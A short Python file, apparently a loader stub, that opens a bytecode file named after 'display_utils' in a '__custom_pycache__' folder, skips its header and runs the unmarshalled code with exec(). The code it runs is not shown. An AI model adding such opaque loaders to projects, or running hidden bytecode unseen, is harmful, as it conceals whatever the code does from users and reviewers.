
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'display_utils_58bc995cbc804f04b10d731841745781.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
